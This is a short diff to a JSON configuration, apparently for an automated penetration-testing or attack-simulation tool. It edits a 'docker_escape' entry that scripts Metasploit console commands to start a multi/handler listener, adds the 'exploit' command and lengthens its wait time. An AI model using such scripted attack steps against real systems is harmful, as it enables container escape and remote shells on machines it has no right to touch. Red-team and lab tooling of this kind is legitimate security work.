@@ -8,9 +8,9 @@
         "config": ""
       },
       "docker_escape": {
-        "instructions": "back \nuse exploit/multi/handler \nset target {} \nset LHOST {}\nset VERBOSE true \nset LPORT {LPORT}\n",
+        "instructions": "back \nuse exploit/multi/handler \nset target {} \nset LPORT {LPORT}\n exploit",
         "attack_type": "MetasploitAttack",
-        "wait_time": "20",
+        "wait_time": "50",
         "config": ""
       },
       "smb_server": {
